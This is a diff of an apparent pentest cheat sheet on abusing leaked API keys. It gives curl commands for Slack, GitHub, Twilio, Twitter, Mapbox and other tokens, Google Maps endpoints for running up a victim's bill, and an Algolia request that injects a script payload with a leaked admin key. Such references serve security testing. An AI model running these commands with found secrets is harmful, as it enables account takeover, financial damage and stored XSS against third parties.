@@ -16,7 +16,7 @@
     - [Twitter Bearer Token](#twitter-bearer-token)
     - [Gitlab Personal Access Token](#gitlab-personal-access-token)
     - [HockeyApp API Token](#hockeyapp-api-token)
-    - [Mapbox API Token](#Mapbox-API-Token)
+    - [Mapbox API Token](#mapbox-api-token)
 
 
 ## Tools
@@ -57,28 +57,29 @@ The following commands can be used to takeover accounts or extract personal info
 
 ### Google Maps 
 
-Use : https://github.com/ozguralp/gmapsapiscanner/
+* [ozguralp/gmapsapiscanner/](https://github.com/ozguralp/gmapsapiscanner/) - Google Maps API Scanner
 
 |  Name                 |  Endpoint |
 | --------------------- | --------- |
-|  Static Maps          | https://maps.googleapis.com/maps/api/staticmap?center=45%2C10&zoom=7&size=400x400&key=KEY_HERE   |
-|  Streetview           | https://maps.googleapis.com/maps/api/streetview?size=400x400&location=40.720032,-73.988354&fov=90&heading=235&pitch=10&key=KEY_HERE |
-|  Embed                | https://www.google.com/maps/embed/v1/place?q=place_id:ChIJyX7muQw8tokR2Vf5WBBk1iQ&key=KEY_HERE  |
-|  Directions           | https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&destination=Universal+Studios+Hollywood4&key=KEY_HERE    |
-|  Geocoding            | https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30&key=KEY_HERE |
-|  Distance Matrix      | https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=40.6655101,-73.89188969999998&destinations=40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626&key=KEY_HERE   |
-|  Find Place from Text | https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum%20of%20Contemporary%20Art%20Australia&inputtype=textquery&fields=photos,formatted_address,name,rating,opening_hours,geometry&key=KEY_HERE    |
-|  Autocomplete         | https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh&types=%28cities%29&key=KEY_HERE    |
-|  Elevation            | https://maps.googleapis.com/maps/api/elevation/json?locations=39.7391536,-104.9847034&key=KEY_HERE  |
-|  Timezone             | https://maps.googleapis.com/maps/api/timezone/json?location=39.6034810,-119.6822510&timestamp=1331161200&key=KEY_HERE   |
-|  Roads                | https://roads.googleapis.com/v1/nearestRoads?points=60.170880,24.942795|60.170879,24.942796|60.170877,24.942796&key=KEY_HERE    |
-|  Geolocate            | https://www.googleapis.com/geolocation/v1/geolocate?key=KEY_HERE |
+|  Static Maps          | [/maps/api/staticmap?key=KEY](https://maps.googleapis.com/maps/api/staticmap?center=45%2C10&zoom=7&size=400x400&key=KEY) |
+|  Streetview           | [/maps/api/streetview?key=KEY](https://maps.googleapis.com/maps/api/streetview?size=400x400&location=40.720032,-73.988354&fov=90&heading=235&pitch=10&key=KEY) |
+|  Embed                | [/maps/embed/v1/place?key=KEY](https://www.google.com/maps/embed/v1/place?q=place_id:ChIJyX7muQw8tokR2Vf5WBBk1iQ&key=KEY) |
+|  Directions           | [/maps/api/directions/json?key=KEY](https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&destination=Universal+Studios+Hollywood4&key=KEY) |
+|  Geocoding            | [/maps/api/geocode/json?key=KEY](https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30&key=KEY) |
+|  Distance Matrix      | [/maps/api/distancematrix/json?key=KEY](https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=40.6655101,-73.89188969999998&destinations=40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626&key=KEY) |
+|  Find Place from Text | [/maps/api/place/findplacefromtext/json?key=KEY](https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum%20of%20Contemporary%20Art%20Australia&inputtype=textquery&fields=photos,formatted_address,name,rating,opening_hours,geometry&key=KEY) |
+|  Autocomplete         | [/maps/api/place/autocomplete/json?key=KEY](https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh&types=%28cities%29&key=KEY) |
+|  Elevation            | [/maps/api/elevation/json?key=KEY](https://maps.googleapis.com/maps/api/elevation/json?locations=39.7391536,-104.9847034&key=KEY)   |
+|  Timezone             | [/maps/api/timezone/json?key=KEY](https://maps.googleapis.com/maps/api/timezone/json?location=39.6034810,-119.6822510&timestamp=1331161200&key=KEY) |
+|  Roads                | [roads.googleapis.com/v1/nearestRoads?key=KEY](https://roads.googleapis.com/v1/nearestRoads?points=60.170880,24.942795&key=KEY) |
+|  Geolocate            | [www.googleapis.com/geolocation/v1/geolocate?key=KEY](https://www.googleapis.com/geolocation/v1/geolocate?key=KEY) |
 
 
-Impact:
+**Impact**:
 
 * Consuming the company's monthly quota or can over-bill with unauthorized usage of this service and do financial damage to the company
 * Conduct a denial of service attack specific to the service if any limitation of maximum bill control settings exist in the Google account
+
 
 ### Algolia 
 
@@ -91,11 +92,13 @@ curl --request PUT \
   --data '{"highlightPreTag": "<script>alert(1);</script>"}'
 ```
 
+
 ### Slack API Token
 
 ```powershell
 curl -sX POST "https://slack.com/api/auth.test?token=xoxp-TOKEN_HERE&pretty=1"
 ```
+
 
 ### Facebook Access Token
 
@@ -103,11 +106,13 @@ curl -sX POST "https://slack.com/api/auth.test?token=xoxp-TOKEN_HERE&pretty=1"
 curl https://developers.facebook.com/tools/debug/accesstoken/?access_token=ACCESS_TOKEN_HERE&version=v3.2
 ```
 
+
 ### Github client id and client secret
 
 ```powershell
 curl 'https://api.github.com/users/whatever?client_id=xxxx&client_secret=yyyy'
 ```
+
 
 ### Twilio Account_sid and Auth token
 
@@ -115,17 +120,20 @@ curl 'https://api.github.com/users/whatever?client_id=xxxx&client_secret=yyyy'
 curl -X GET 'https://api.twilio.com/2010-04-01/Accounts.json' -u ACCOUNT_SID:AUTH_TOKEN
 ```
 
+
 ### Twitter API Secret
 
 ```powershell
 curl -u 'API key:API secret key' --data 'grant_type=client_credentials' 'https://api.twitter.com/oauth2/token'
 ```
 
+
 ### Twitter Bearer Token
 
 ```powershell
 curl --request GET --url https://api.twitter.com/1.1/account_activity/all/subscriptions/count.json --header 'authorization: Bearer TOKEN'
 ```
+
 
 ### Gitlab Personal Access Token
 
@@ -145,8 +153,15 @@ curl -H "X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c" https://rink.hoc
 
 A Mapbox API Token is a JSON Web Token (JWT). If the header of the JWT is `sk`, jackpot. If it's `pk` or `tk`, it's not worth your time.
 
-* Check token validity: `curl "https://api.mapbox.com/tokens/v2?access_token=YOUR_MAPBOX_ACCESS_TOKEN"`
-* Get list of all tokens associated with an account (only works if the token is a Secret Token (sk), and has the appropriate scope): `curl "https://api.mapbox.com/tokens/v2/MAPBOX_USERNAME_HERE?access_token=YOUR_MAPBOX_ACCESS_TOKEN"`
+* Check token validity: 
+    ```ps1
+    curl "https://api.mapbox.com/tokens/v2?access_token=YOUR_MAPBOX_ACCESS_TOKEN"
+    ```
+    
+* Get list of all tokens associated with an account (only works if the token is a Secret Token (sk), and has the appropriate scope)
+    ```ps1
+    curl "https://api.mapbox.com/tokens/v2/MAPBOX_USERNAME_HERE?access_token=YOUR_MAPBOX_ACCESS_TOKEN"
+    ```
 
 
 ## References
